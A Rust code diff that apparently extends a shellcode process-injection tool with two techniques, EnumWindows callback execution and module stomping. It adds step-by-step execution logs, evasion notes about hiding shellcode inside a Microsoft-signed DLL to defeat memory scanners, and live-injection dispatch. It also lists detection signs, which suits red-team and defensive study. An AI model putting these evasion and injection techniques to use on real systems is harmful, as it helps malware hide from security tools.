@@ -1,9 +1,11 @@
 pub mod apc;
+pub mod callback;
 mod common;
 pub mod crt;
 pub mod earlybird;
 pub mod hijack;
 pub mod section;
+pub mod stomp;
 pub mod wrappers;
 
 use crate::log::LogSink;
@@ -17,6 +19,8 @@ pub enum InjectionTechnique {
     ThreadHijack,
     EarlyBird,
     SectionMapping,
+    Callback,
+    ModuleStomp,
 }
 
 impl InjectionTechnique {
@@ -32,6 +36,8 @@ impl InjectionTechnique {
             "section" | "sectionmapping" | "mapview" | "ntmapviewofsection" => {
                 Some(Self::SectionMapping)
             }
+            "callback" | "enumwindows" | "timerqueue" | "threadpool" => Some(Self::Callback),
+            "stomp" | "modulestomp" | "dllstomp" => Some(Self::ModuleStomp),
             _ => None,
         }
     }
@@ -43,6 +49,8 @@ impl InjectionTechnique {
             Self::ThreadHijack => "Thread Hijack (SetThreadContext)",
             Self::EarlyBird => "Early Bird APC",
             Self::SectionMapping => "Section Mapping (MapViewOfFile)",
+            Self::Callback => "Callback Execution (EnumWindows)",
+            Self::ModuleStomp => "Module Stomping",
         }
     }
 }
@@ -134,10 +142,41 @@ pub fn dry_run(pid: u32, technique: &str, log: &LogSink) {
                 log.warning("    - CreateRemoteThread is still used for execution");
                 log.warning("    - Key advantage: memory write happens locally, not cross-process");
             }
+            InjectionTechnique::Callback => {
+                log.detail("  Steps:");
+                log.detail("    1. VirtualAlloc(PAGE_READWRITE) — allocate local memory");
+                log.detail("    2. Copy shellcode bytes to allocated region");
+                log.detail("    3. VirtualProtect(PAGE_EXECUTE_READ) — make executable");
+                log.detail("    4. Cast address to WNDENUMPROC callback");
+                log.detail("    5. EnumWindows(callback, 0) — Windows calls shellcode per window");
+                log.detail("    6. Shellcode returns FALSE to stop enumeration");
+                log.info("");
+                log.warning("  Detection:");
+                log.warning("    - No CreateRemoteThread or CreateThread — callback mechanism");
+                log.warning("    - VirtualAlloc + VirtualProtect pattern is still flagged");
+                log.warning("    - EnumWindows callback from non-module memory is suspicious");
+                log.warning("    - Key advantage: no thread creation APIs called");
+            }
+            InjectionTechnique::ModuleStomp => {
+                log.detail("  Steps:");
+                log.detail("    1. LoadLibraryExA(victim.dll, DONT_RESOLVE_DLL_REFERENCES)");
+                log.detail("    2. Parse PE → find .text section (base + size)");
+                log.detail("    3. VirtualProtect(.text, PAGE_READWRITE)");
+                log.detail("    4. Overwrite .text with shellcode bytes");
+                log.detail("    5. VirtualProtect(.text, PAGE_EXECUTE_READ)");
+                log.info("");
+                log.detail(format!("  Victim DLL: {} (large .text, rarely used)", stomp::victim_dll()));
+                log.info("");
+                log.warning("  Detection:");
+                log.warning("    - Shellcode lives in memory backed by a signed DLL");
+                log.warning("    - Memory scanners see legitimate module, not anonymous RWX");
+                log.warning("    - DLL load without init (DONT_RESOLVE_DLL_REFERENCES) is noted");
+                log.warning("    - Key advantage: shellcode hides inside a Microsoft-signed module");
+            }
         }
     } else {
         log.error(format!("  Unknown technique: {}", technique));
-        log.info("  Known techniques: createremote, apc, hijack, earlybird, section");
+        log.info("  Known techniques: createremote, apc, hijack, earlybird, section, callback, stomp");
     }
 }
 
@@ -179,6 +218,18 @@ pub fn print_info(log: &LogSink) {
     log.detail("     - Execute via CreateRemoteThread");
     log.warning("     - Bypasses WriteProcessMemory hooks, but CRT is still visible");
     log.info("");
+    log.info("  6. Callback Execution (EnumWindows)");
+    log.detail("     - Alloc + write + protect shellcode in local process");
+    log.detail("     - Cast to WNDENUMPROC, call EnumWindows → shellcode fires");
+    log.detail("     - No CreateRemoteThread, no CreateThread");
+    log.warning("     - Callback from non-module memory is suspicious");
+    log.info("");
+    log.info("  7. Module Stomping");
+    log.detail("     - Load a legitimate signed DLL without init");
+    log.detail("     - Overwrite its .text section with shellcode");
+    log.detail("     - Shellcode lives inside a Microsoft-signed module in memory");
+    log.warning("     - Defeats memory scanners looking for anonymous executable pages");
+    log.info("");
     log.warning("Detection considerations:");
     log.warning("  - All these techniques are WELL KNOWN to EDR vendors");
     log.warning("  - Modern EDRs hook the underlying NT APIs");
@@ -206,7 +257,11 @@ pub fn live_inject(
     if shellcode.is_empty() {
         return Err("shellcode is empty — nothing to inject".to_string());
     }
-    if *technique != InjectionTechnique::EarlyBird {
+    let skip_pid = matches!(
+        technique,
+        InjectionTechnique::EarlyBird | InjectionTechnique::Callback | InjectionTechnique::ModuleStomp
+    );
+    if !skip_pid {
         crate::safety::validate_target(pid)
             .map_err(|e| format!("target validation failed: {}", e))?;
     }
@@ -218,6 +273,8 @@ pub fn live_inject(
             earlybird::live_inject(shellcode, "C:\\Windows\\System32\\notepad.exe", log)
         }
         InjectionTechnique::SectionMapping => section::live_inject(pid, shellcode, log),
+        InjectionTechnique::Callback => callback::live_inject(shellcode, log),
+        InjectionTechnique::ModuleStomp => stomp::live_inject(shellcode, log),
     }
 }
 
@@ -258,8 +315,12 @@ pub fn run_live_injection(pid: u32, technique_name: &str, payload_path: &str, lo
         payload_path,
         shellcode.len()
     ));
-    if technique == InjectionTechnique::EarlyBird {
-        log.info("  Mode: spawns a new suspended process (PID not required)");
+    let no_pid = matches!(
+        technique,
+        InjectionTechnique::EarlyBird | InjectionTechnique::Callback | InjectionTechnique::ModuleStomp
+    );
+    if no_pid {
+        log.info("  Mode: local execution (PID not required)");
     } else {
         log.info(format!("  Target PID: {}", pid));
     }
